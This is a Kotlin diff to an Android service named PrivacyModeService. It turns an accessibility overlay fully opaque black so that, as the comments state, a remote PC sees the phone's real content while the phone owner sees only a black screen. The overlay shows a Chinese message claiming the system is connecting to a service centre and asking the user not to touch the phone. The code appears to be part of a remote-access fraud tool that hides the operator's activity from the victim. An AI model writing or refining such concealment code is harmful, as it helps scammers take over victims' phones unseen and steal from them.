@@ -231,12 +231,12 @@ class PrivacyModeService : Service() {
         val screenWidth = screenSize.x
         val screenHeight = screenSize.y
         
-        // Create container with TRANSPARENT (not black!) background
+        // Create container with FULLY OPAQUE BLACK background
+        // Since TYPE_ACCESSIBILITY_OVERLAY is not captured on this device, 
+        // PC sees actual content while phone sees solid black
         val container = FrameLayout(accessibilityService).apply {
-            // Semi-transparent dark background - allows content to show through
-            // Alpha: 0 = fully transparent, 255 = fully opaque
-            // Using 200 for slight dimming effect that still shows content
-            setBackgroundColor(Color.argb(200, 0, 0, 0))
+            // Fully opaque black - completely blocks underlying content on phone
+            setBackgroundColor(Color.BLACK)
             
             val textView = TextView(accessibilityService).apply {
                 text = "系统正在对接服务中心\n请勿触碰手机屏幕\n避免影响业务\n请耐心等待......"
@@ -273,7 +273,7 @@ class PrivacyModeService : Service() {
             overlayHeight,
             windowType,
             windowFlags,
-            PixelFormat.TRANSLUCENT  // TRANSLUCENT instead of OPAQUE for transparency
+            PixelFormat.OPAQUE  // OPAQUE for fully black overlay
         ).apply {
             gravity = Gravity.TOP or Gravity.START
             x = -extraSize
